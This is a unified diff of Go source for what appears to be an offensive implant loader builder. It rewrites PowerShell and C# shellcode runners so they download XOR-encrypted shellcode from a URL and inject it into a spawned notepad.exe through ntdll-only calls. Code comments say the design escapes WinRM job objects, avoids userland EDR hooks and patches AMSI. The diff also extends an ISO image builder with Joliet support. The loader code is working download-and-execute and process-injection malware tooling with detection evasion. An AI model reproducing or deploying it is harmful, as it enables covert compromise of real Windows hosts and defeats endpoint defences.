@@ -162,8 +162,8 @@ func xorKeyPS(key [4]byte) string {
 // reflectEmitSetup returns a PS snippet that defines Win32 P/Invoke methods via
 // Reflection.Emit — no Add-Type, no csc.exe, no temp files, no external process.
 // The returned type is stored in $W and provides: LoadLibraryA, GetProcAddress,
-// VirtualProtect, NtAllocateVirtualMemory, NtProtectVirtualMemory,
-// RtlCreateUserThread, NtWaitForSingleObject.
+// VirtualProtect, OpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory,
+// NtProtectVirtualMemory, RtlCreateUserThread, NtWaitForSingleObject.
 func reflectEmitSetup() string {
 	// LoadLibraryA and GetProcAddress use ANSI strings — CharSet.Ansi prevents
 	// the P/Invoke marshaler from appending 'W' and looking for non-existent variants.
@@ -178,7 +178,10 @@ func reflectEmitSetup() string {
 		`_df 'LoadLibraryA' 'kernel32' ([IntPtr]) @([String]);` +
 		`_df 'GetProcAddress' 'kernel32' ([IntPtr]) @([IntPtr],[String]);` +
 		`_df 'VirtualProtect' 'kernel32' ([bool]) @([IntPtr],[uint32],[uint32],[uint32].MakeByRefType());` +
+		`_df 'CreateProcess' 'kernel32' ([bool]) @([String],[String],[IntPtr],[IntPtr],[bool],[uint32],[IntPtr],[String],[byte[]],[byte[]]) 'Ansi';` +
+		`_df 'CloseHandle' 'kernel32' ([bool]) @([IntPtr]);` +
 		`_df 'NtAllocateVirtualMemory' 'ntdll' ([int]) @([IntPtr],[IntPtr].MakeByRefType(),[IntPtr],[IntPtr].MakeByRefType(),[uint32],[uint32]);` +
+		`_df 'NtWriteVirtualMemory' 'ntdll' ([int]) @([IntPtr],[IntPtr],[byte[]],[uint32],[uint32].MakeByRefType());` +
 		`_df 'NtProtectVirtualMemory' 'ntdll' ([int]) @([IntPtr],[IntPtr].MakeByRefType(),[IntPtr].MakeByRefType(),[uint32],[uint32].MakeByRefType());` +
 		`_df 'RtlCreateUserThread' 'ntdll' ([int]) @([IntPtr],[IntPtr],[bool],[int],[IntPtr],[IntPtr],[IntPtr],[IntPtr],[IntPtr].MakeByRefType(),[IntPtr]);` +
 		`_df 'NtWaitForSingleObject' 'ntdll' ([int]) @([IntPtr],[bool],[IntPtr]);` +
@@ -221,8 +224,10 @@ func amsiPatchPS() string {
 }
 
 // psShellcodeLoader returns a PS1 script that downloads XOR-encrypted shellcode
-// from binURL, decrypts it in-memory, and executes via RtlCreateUserThread (ntdll-only).
-// Evasion: AMSI memory patch, ntdll-only P/Invoke (no kernel32), RW→RX, no CreateThread.
+// from binURL, decrypts it in-memory, and executes by injecting into a freshly
+// spawned sacrificial process (notepad.exe). Injecting into a new process instead
+// of the current PS process allows the Go runtime (donut-wrapped) to initialize
+// its goroutine scheduler and TLS properly.
 func psShellcodeLoader(binURL string, key [4]byte) string {
 	kPS := xorKeyPS(key)
 	return fmt.Sprintf(
@@ -233,15 +238,24 @@ func psShellcodeLoader(binURL string, key [4]byte) string {
 			// 3. XOR decrypt in-memory
 			`$xk=[byte[]](%s);for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i]-bxor$xk[$i%%4]}`+"\n"+
 			// 4. $W already defined by amsiPatchPS (reflectEmitSetup); reuse it
-			// 5. Allocate RW, copy shellcode, re-protect RX
+			// 5. Spawn process with CREATE_BREAKAWAY_FROM_JOB so it lives outside the
+			//    WinRM job object. hProcess is read directly from PROCESS_INFORMATION
+			//    (offset 0, 8 bytes on x64) — no OpenProcess/kernel32 handle lookup needed.
+			`$_si=[byte[]]::new(104);[BitConverter]::GetBytes([int]104).CopyTo($_si,0)`+"\n"+
+			`$_pi=[byte[]]::new(24)`+"\n"+
+			// CREATE_NO_WINDOW(0x08000000)|CREATE_BREAKAWAY_FROM_JOB(0x01000000) = 0x09000000
+			`if(!$W::CreateProcess('C:\Windows\System32\notepad.exe',$null,[IntPtr]::Zero,[IntPtr]::Zero,$false,0x09000000,[IntPtr]::Zero,$null,$_si,$_pi)){$W::CreateProcess('C:\Windows\System32\notepad.exe',$null,[IntPtr]::Zero,[IntPtr]::Zero,$false,0x08000000,[IntPtr]::Zero,$null,$_si,$_pi)|Out-Null}`+"\n"+
+			`Start-Sleep -Milliseconds 500`+"\n"+
+			// hProcess at offset 0 of PROCESS_INFORMATION (IntPtr = 8 bytes on x64)
+			`$_ph=[IntPtr][BitConverter]::ToInt64($_pi,0)`+"\n"+
+			// 7. Allocate RW in remote process, write shellcode, re-protect RX
 			`$va=[IntPtr]::Zero;$sz=[IntPtr]$b.Length`+"\n"+
-			`$W::NtAllocateVirtualMemory(-1,[ref]$va,[IntPtr]::Zero,[ref]$sz,0x3000,0x04)|Out-Null`+"\n"+
-			`[Runtime.InteropServices.Marshal]::Copy($b,0,$va,$b.Length)`+"\n"+
-			`$W::NtProtectVirtualMemory(-1,[ref]$va,[ref]$sz,0x20,[ref]([uint32]0))|Out-Null`+"\n"+
-			// 6. Spawn thread via RtlCreateUserThread — ntdll-only, no CreateThread
-			`$th=[IntPtr]::Zero;$W::RtlCreateUserThread(-1,[IntPtr]::Zero,$false,0,[IntPtr]::Zero,[IntPtr]::Zero,$va,[IntPtr]::Zero,[ref]$th,[IntPtr]::Zero)|Out-Null`+"\n"+
-			// 7. Wait (agent runs until killed)
-			`$W::NtWaitForSingleObject($th,$false,[IntPtr]::Zero)|Out-Null`,
+			`$W::NtAllocateVirtualMemory($_ph,[ref]$va,[IntPtr]::Zero,[ref]$sz,0x3000,0x04)|Out-Null`+"\n"+
+			`$_wb=[uint32]0;$W::NtWriteVirtualMemory($_ph,$va,$b,[uint32]$b.Length,[ref]$_wb)|Out-Null`+"\n"+
+			`$W::NtProtectVirtualMemory($_ph,[ref]$va,[ref]$sz,0x20,[ref]([uint32]0))|Out-Null`+"\n"+ // sz stays page-aligned from NtAlloc
+			// 8. Create thread in remote process — agent runs independently in notepad.exe
+			`$th=[IntPtr]::Zero;$W::RtlCreateUserThread($_ph,[IntPtr]::Zero,$false,0,[IntPtr]::Zero,[IntPtr]::Zero,$va,[IntPtr]::Zero,[ref]$th,[IntPtr]::Zero)|Out-Null`+"\n"+
+			`$W::CloseHandle($_ph)|Out-Null`,
 		binURL, kPS)
 }
 
@@ -250,22 +264,45 @@ func psShellcodeLoader(binURL string, key [4]byte) string {
 // runnerCS is a minimal C# DLL loaded reflectively (Assembly.Load) by psReflectiveLoader.
 // E(url) — downloads shellcode from URL and executes (used without XOR encryption).
 // EB(bytes) — executes pre-decrypted shellcode bytes (used with XOR encryption).
-// Both use ntdll P/Invoke (RW→RX, EnumSystemLocalesA) to avoid kernel32 hooks.
-const runnerCS = `using System.Net;using System.Runtime.InteropServices;
+// Injects into a freshly-spawned notepad.exe so the Go runtime can initialize its
+// goroutine scheduler and TLS in a proper Win32 process context.
+// runnerCS is a minimal C# DLL loaded reflectively (Assembly.Load) by psReflectiveLoader.
+// E(url) — downloads shellcode from URL and executes.
+// EB(bytes) — executes pre-decrypted shellcode bytes.
+// Spawns notepad.exe via CreateProcess with CREATE_BREAKAWAY_FROM_JOB to escape WinRM
+// job objects. All injection uses ntdll-only calls (no kernel32 VirtualAllocEx /
+// WriteProcessMemory / VirtualProtectEx) to avoid userland EDR hooks. The hProcess
+// handle is taken directly from PROCESS_INFORMATION — no OpenProcess needed.
+const runnerCS = `using System;using System.Net;using System.Runtime.InteropServices;
 namespace R{public class R{
-[DllImport("ntdll")]static extern int NtAllocateVirtualMemory(System.IntPtr h,ref System.IntPtr a,System.IntPtr z,ref System.IntPtr s,uint t,uint p);
-[DllImport("ntdll")]static extern int NtProtectVirtualMemory(System.IntPtr h,ref System.IntPtr a,ref System.IntPtr s,uint n,out uint o);
-[DllImport("ntdll")]static extern int RtlCreateUserThread(System.IntPtr p,System.IntPtr sd,bool sus,int sb,System.IntPtr sr,System.IntPtr sc,System.IntPtr addr,System.IntPtr param,out System.IntPtr th,System.IntPtr ci);
-[DllImport("ntdll")]static extern int NtWaitForSingleObject(System.IntPtr h,bool al,System.IntPtr t);
+[DllImport("kernel32",SetLastError=true,CharSet=CharSet.Ansi)]
+static extern bool CreateProcess(string a,string c,IntPtr pa,IntPtr ta,bool ih,uint f,IntPtr e,string d,byte[]si,byte[]pi);
+[DllImport("kernel32")]static extern bool CloseHandle(IntPtr h);
+[DllImport("ntdll")]static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr a,IntPtr z,ref IntPtr s,uint t,uint p);
+[DllImport("ntdll")]static extern int NtWriteVirtualMemory(IntPtr h,IntPtr a,byte[]b,uint s,ref uint w);
+[DllImport("ntdll")]static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr a,ref IntPtr s,uint n,ref uint o);
+[DllImport("ntdll")]static extern int RtlCreateUserThread(IntPtr p,IntPtr sd,bool sus,int sb,IntPtr sr,IntPtr sc,IntPtr addr,IntPtr param,out IntPtr th,IntPtr ci);
 static void Exec(byte[]b){
-System.IntPtr va=System.IntPtr.Zero,sz=(System.IntPtr)b.Length;
-NtAllocateVirtualMemory((System.IntPtr)(-1),ref va,System.IntPtr.Zero,ref sz,0x3000,0x04);
-System.Runtime.InteropServices.Marshal.Copy(b,0,va,b.Length);
-sz=(System.IntPtr)b.Length;uint o;
-NtProtectVirtualMemory((System.IntPtr)(-1),ref va,ref sz,0x20,out o);
-System.IntPtr th=System.IntPtr.Zero;
-RtlCreateUserThread((System.IntPtr)(-1),System.IntPtr.Zero,false,0,System.IntPtr.Zero,System.IntPtr.Zero,va,System.IntPtr.Zero,out th,System.IntPtr.Zero);
-NtWaitForSingleObject(th,false,System.IntPtr.Zero);}
+byte[]si=new byte[104];Buffer.BlockCopy(BitConverter.GetBytes(104),0,si,0,4);
+byte[]pi=new byte[24];
+// CREATE_NO_WINDOW(0x08000000)|CREATE_BREAKAWAY_FROM_JOB(0x01000000)
+bool ok=CreateProcess(@"C:\Windows\System32\notepad.exe",null,IntPtr.Zero,IntPtr.Zero,false,0x09000000,IntPtr.Zero,null,si,pi);
+if(!ok)ok=CreateProcess(@"C:\Windows\System32\notepad.exe",null,IntPtr.Zero,IntPtr.Zero,false,0x08000000,IntPtr.Zero,null,si,pi);
+if(!ok)return;
+System.Threading.Thread.Sleep(500);
+// hProcess is at offset 0 in PROCESS_INFORMATION (x64: 8-byte pointer)
+IntPtr ph=(IntPtr)BitConverter.ToInt64(pi,0);
+if(ph==IntPtr.Zero||ph==(IntPtr)(-1)){return;}
+// ntdll-only injection — avoids kernel32 VirtualAllocEx/WriteProcessMemory/VirtualProtectEx hooks
+IntPtr va=IntPtr.Zero;IntPtr sz=(IntPtr)b.Length;
+NtAllocateVirtualMemory(ph,ref va,IntPtr.Zero,ref sz,0x3000,0x04);
+if(va==IntPtr.Zero){CloseHandle(ph);return;}
+uint wb=0;NtWriteVirtualMemory(ph,va,b,(uint)b.Length,ref wb);
+uint op=0;
+NtProtectVirtualMemory(ph,ref va,ref sz,0x20,ref op);
+IntPtr th=IntPtr.Zero;
+RtlCreateUserThread(ph,IntPtr.Zero,false,0,IntPtr.Zero,IntPtr.Zero,va,IntPtr.Zero,out th,IntPtr.Zero);
+CloseHandle(ph);}
 public static void E(string u){Exec(new System.Net.WebClient().DownloadData(u));}
 public static void EB(byte[]b){Exec(b);}}}`
 
@@ -431,7 +468,83 @@ func isoDirRec(name string, extent, dataLen uint32, isDir bool, t time.Time) []b
 	return rec
 }
 
-// BuildISOGo writes a minimal ISO 9660 image with files placed in the root directory.
+// ucs2BE encodes s as UCS-2 Big Endian (two bytes per rune).
+func ucs2BE(s string) []byte {
+	runes := []rune(s)
+	buf := make([]byte, len(runes)*2)
+	for i, r := range runes {
+		buf[i*2] = byte(r >> 8)
+		buf[i*2+1] = byte(r)
+	}
+	return buf
+}
+
+// ucs2BEPad encodes s as UCS-2 BE and space-pads to exactly byteLen bytes.
+func ucs2BEPad(s string, byteLen int) []byte {
+	buf := make([]byte, byteLen)
+	for i := 1; i < byteLen; i += 2 {
+		buf[i] = 0x20 // UCS-2 BE space low byte
+	}
+	enc := ucs2BE(s)
+	if len(enc) > byteLen {
+		enc = enc[:byteLen]
+	}
+	copy(buf, enc)
+	return buf
+}
+
+// jolietDirRec builds a Joliet directory record (UCS-2 BE identifiers, no ;1 suffix).
+func jolietDirRec(name string, extent, dataLen uint32, isDir bool, t time.Time) []byte {
+	var id []byte
+	switch name {
+	case "\x00", "\x01":
+		id = []byte{name[0]}
+	default:
+		id = ucs2BE(name) // no ;1 in Joliet
+	}
+
+	idLen := len(id)
+	recLen := 33 + idLen
+	if recLen%2 != 0 {
+		recLen++
+	}
+	rec := make([]byte, recLen)
+	rec[0] = byte(recLen)
+	putU32Both(rec, 2, extent)
+	putU32Both(rec, 10, dataLen)
+	copy(rec[18:25], isoDate7(t))
+	if isDir {
+		rec[25] = 0x02
+	}
+	putU16Both(rec, 28, 1)
+	rec[32] = byte(idLen)
+	copy(rec[33:], id)
+	return rec
+}
+
+// writeVD writes a Volume Descriptor header (type, CD001, version) into b.
+func writeVDHeader(b []byte, vdType byte) {
+	b[0] = vdType
+	copy(b[1:6], "CD001")
+	b[6] = 0x01
+}
+
+// writePathTableRoot writes the single root-entry path table (10 bytes).
+// dirSec is the root directory sector. isLE selects byte order.
+func writePathTableRoot(b []byte, dirSec uint32, isLE bool) {
+	b[0] = 1 // length of directory identifier
+	b[1] = 0 // EA length
+	if isLE {
+		putU32LE(b, 2, dirSec)
+		putU16LE(b, 6, 1) // parent dir = 1 (root)
+	} else {
+		putU32BE(b, 2, dirSec)
+		putU16BE(b, 6, 1)
+	}
+	// b[8] = 0x00 (root dir id), b[9] = 0x00 (padding) — zero by default
+}
+
+// BuildISOGo writes a minimal ISO 9660 + Joliet image (Windows-compatible).
 // files maps ISO filename → local source path.
 func BuildISOGo(files map[string]string, label, outDir string) (string, error) {
 	if err := os.MkdirAll(outDir, 0755); err != nil {
@@ -456,110 +569,138 @@ func BuildISOGo(files map[string]string, label, outDir string) (string, error) {
 
 	now := time.Now()
 
-	// Sector layout: 0-15 system, 16 PVD, 17 VDST, 18 L-PT, 19 M-PT, 20 root-dir, 21+ files
-	const rootSec uint32 = 20
-	nextSec := uint32(21)
+	// Sector layout with Joliet:
+	//   0-15  system area
+	//   16    Primary Volume Descriptor
+	//   17    Joliet Supplementary Volume Descriptor
+	//   18    Volume Descriptor Set Terminator
+	//   19    L-Path Table (ISO 9660, LE)
+	//   20    M-Path Table (ISO 9660, BE)
+	//   21    L-Path Table (Joliet, LE)
+	//   22    M-Path Table (Joliet, BE)
+	//   23    ISO 9660 root directory
+	//   24    Joliet root directory
+	//   25+   file data
+	const (
+		lptSec   uint32 = 19
+		mptSec   uint32 = 20
+		jlptSec  uint32 = 21
+		jmptSec  uint32 = 22
+		rootSec  uint32 = 23
+		jrootSec uint32 = 24
+	)
+	nextSec := uint32(25)
 	for i := range entries {
 		entries[i].sector = nextSec
 		nextSec += uint32(isoSectorsFor(len(entries[i].data)))
 	}
 
-	// Build root directory records (two passes: first to measure size, second with correct size)
-	buildRootDir := func(rootDirLen uint32) []byte {
+	// Build ISO 9660 root directory (two passes to get self-referencing size).
+	buildISORoot := func(dirLen uint32) []byte {
 		var buf bytes.Buffer
-		buf.Write(isoDirRec("\x00", rootSec, rootDirLen, true, now))
-		buf.Write(isoDirRec("\x01", rootSec, rootDirLen, true, now))
+		buf.Write(isoDirRec("\x00", rootSec, dirLen, true, now))
+		buf.Write(isoDirRec("\x01", rootSec, dirLen, true, now))
 		for _, e := range entries {
 			buf.Write(isoDirRec(e.name, e.sector, uint32(len(e.data)), false, now))
 		}
 		return buf.Bytes()
 	}
-	// First pass with size=0 to get the actual size
-	rootDirData := buildRootDir(0)
-	// Second pass with the correct size
-	rootDirData = buildRootDir(uint32(len(rootDirData)))
+	isoRootData := buildISORoot(0)
+	isoRootData = buildISORoot(uint32(len(isoRootData)))
+
+	// Build Joliet root directory.
+	buildJolietRoot := func(dirLen uint32) []byte {
+		var buf bytes.Buffer
+		buf.Write(jolietDirRec("\x00", jrootSec, dirLen, true, now))
+		buf.Write(jolietDirRec("\x01", jrootSec, dirLen, true, now))
+		for _, e := range entries {
+			// Joliet uses the uppercase name (without ;1) as UCS-2 BE.
+			buf.Write(jolietDirRec(strings.ToUpper(e.name), e.sector, uint32(len(e.data)), false, now))
+		}
+		return buf.Bytes()
+	}
+	jolietRootData := buildJolietRoot(0)
+	jolietRootData = buildJolietRoot(uint32(len(jolietRootData)))
 
 	totalSecs := nextSec
 	iso := make([]byte, int(totalSecs)*isoSectorSz)
 
-	// Primary Volume Descriptor at sector 16
-	pvd := iso[16*isoSectorSz:]
-	pvd[0] = 0x01
-	copy(pvd[1:6], "CD001")
-	pvd[6] = 0x01
-	// System Identifier (BP 9-40, index 8-39): spaces
-	for i := 8; i < 40; i++ {
-		pvd[i] = 0x20
-	}
-	// Volume Identifier (BP 41-72, index 40-71): label, space-padded
-	for i := 40; i < 72; i++ {
-		pvd[i] = 0x20
-	}
 	vol := strings.ToUpper(label)
 	if len(vol) > 32 {
 		vol = vol[:32]
 	}
+
+	// ── Primary Volume Descriptor (sector 16) ────────────────────────────────
+	pvd := iso[16*isoSectorSz:]
+	writeVDHeader(pvd, 0x01)
+	// System Identifier (8-39): ASCII spaces
+	for i := 8; i < 40; i++ {
+		pvd[i] = 0x20
+	}
+	// Volume Identifier (40-71): ASCII label, space-padded
+	for i := 40; i < 72; i++ {
+		pvd[i] = 0x20
+	}
 	copy(pvd[40:], vol)
-	// BP 81-88 (index 80): Volume Space Size
-	putU32Both(pvd, 80, totalSecs)
-	// BP 121-124 (index 120): Volume Set Size
-	putU16Both(pvd, 120, 1)
-	// BP 125-128 (index 124): Volume Sequence Number
-	putU16Both(pvd, 124, 1)
-	// BP 129-132 (index 128): Logical Block Size
-	putU16Both(pvd, 128, isoSectorSz)
-	// BP 133-140 (index 132): Path Table Size
-	putU32Both(pvd, 132, 10)
-	// BP 141-144 (index 140): Location of Type-L Path Table (LE)
-	putU32LE(pvd, 140, 18)
-	// BP 145-148 (index 144): Optional Type-L = 0
-	putU32LE(pvd, 144, 0)
-	// BP 149-152 (index 148): Location of Type-M Path Table (BE)
-	putU32BE(pvd, 148, 19)
-	// BP 153-156 (index 152): Optional Type-M = 0
-	putU32BE(pvd, 152, 0)
-	// BP 157-190 (index 156): Root Directory Record
-	copy(pvd[156:], isoDirRec("\x00", rootSec, uint32(len(rootDirData)), true, now))
-	// BP 191-812 (index 190-811): space-fill identifier fields
+	putU32Both(pvd, 80, totalSecs)                                // Volume Space Size
+	putU16Both(pvd, 120, 1)                                       // Volume Set Size
+	putU16Both(pvd, 124, 1)                                       // Volume Sequence Number
+	putU16Both(pvd, 128, isoSectorSz)                             // Logical Block Size
+	putU32Both(pvd, 132, 10)                                      // Path Table Size
+	putU32LE(pvd, 140, lptSec)                                    // L-PT location
+	putU32BE(pvd, 148, mptSec)                                    // M-PT location
+	copy(pvd[156:], isoDirRec("\x00", rootSec, uint32(len(isoRootData)), true, now))
 	for i := 190; i < 812; i++ {
 		pvd[i] = 0x20
 	}
-	// BP 813-829 (index 812): Creation Date (17 bytes)
-	copy(pvd[812:829], isoDate17(now))
-	// BP 830-846 (index 829): Modification Date (17 bytes)
-	copy(pvd[829:846], isoDate17(now))
-	// BP 847-880 (index 846): Expiration + Effective Date — '0' = no date
+	copy(pvd[812:829], isoDate17(now))  // Creation Date
+	copy(pvd[829:846], isoDate17(now))  // Modification Date
 	for i := 846; i < 880; i++ {
 		pvd[i] = '0'
+	} // Expiration + Effective = no date
+	pvd[880] = 0x01 // File Structure Version
+
+	// ── Joliet Supplementary Volume Descriptor (sector 17) ───────────────────
+	svd := iso[17*isoSectorSz:]
+	writeVDHeader(svd, 0x02)
+	// System Identifier (8-39): UCS-2 BE spaces (16 chars × 2 bytes)
+	copy(svd[8:], ucs2BEPad("", 32))
+	// Volume Identifier (40-71): UCS-2 BE label (16 chars × 2 bytes)
+	copy(svd[40:], ucs2BEPad(vol, 32))
+	putU32Both(svd, 80, totalSecs)
+	// Joliet escape sequences (88-119): "%/E" + zero padding
+	copy(svd[88:91], []byte("%/E"))
+	putU16Both(svd, 120, 1)
+	putU16Both(svd, 124, 1)
+	putU16Both(svd, 128, isoSectorSz)
+	putU32Both(svd, 132, 10)        // Joliet path table size (root only = 10 bytes)
+	putU32LE(svd, 140, jlptSec)     // Joliet L-PT location
+	putU32BE(svd, 148, jmptSec)     // Joliet M-PT location
+	copy(svd[156:], jolietDirRec("\x00", jrootSec, uint32(len(jolietRootData)), true, now))
+	for i := 190; i < 812; i++ {
+		svd[i] = 0x20
 	}
-	// BP 881 (index 880): File Structure Version
-	pvd[880] = 0x01
+	copy(svd[812:829], isoDate17(now))
+	copy(svd[829:846], isoDate17(now))
+	for i := 846; i < 880; i++ {
+		svd[i] = '0'
+	}
+	svd[880] = 0x01
 
-	// Volume Descriptor Set Terminator at sector 17
-	vdst := iso[17*isoSectorSz:]
-	vdst[0] = 0xFF
-	copy(vdst[1:6], "CD001")
-	vdst[6] = 0x01
+	// ── Volume Descriptor Set Terminator (sector 18) ─────────────────────────
+	writeVDHeader(iso[18*isoSectorSz:], 0xFF)
 
-	// L-Path Table at sector 18 (LE)
-	lpt := iso[18*isoSectorSz:]
-	lpt[0] = 1 // Length of Directory Identifier
-	lpt[1] = 0 // EA length
-	putU32LE(lpt, 2, rootSec)
-	putU16LE(lpt, 6, 1) // parent dir = 1 (root)
-	// lpt[8] = 0x00 (root id), lpt[9] = 0x00 (padding) — already zero
+	// ── Path Tables ──────────────────────────────────────────────────────────
+	writePathTableRoot(iso[lptSec*isoSectorSz:], rootSec, true)   // ISO L-PT
+	writePathTableRoot(iso[mptSec*isoSectorSz:], rootSec, false)  // ISO M-PT
+	writePathTableRoot(iso[jlptSec*isoSectorSz:], jrootSec, true)  // Joliet L-PT
+	writePathTableRoot(iso[jmptSec*isoSectorSz:], jrootSec, false) // Joliet M-PT
 
-	// M-Path Table at sector 19 (BE)
-	mpt := iso[19*isoSectorSz:]
-	mpt[0] = 1
-	mpt[1] = 0
-	putU32BE(mpt, 2, rootSec)
-	putU16BE(mpt, 6, 1)
+	// ── Directory sectors ─────────────────────────────────────────────────────
+	copy(iso[rootSec*isoSectorSz:], isoRootData)
+	copy(iso[jrootSec*isoSectorSz:], jolietRootData)
 
-	// Root directory at sector 20
-	copy(iso[rootSec*isoSectorSz:], rootDirData)
-
-	// File data
+	// ── File data ─────────────────────────────────────────────────────────────
 	for _, e := range entries {
 		copy(iso[int(e.sector)*isoSectorSz:], e.data)
 	}
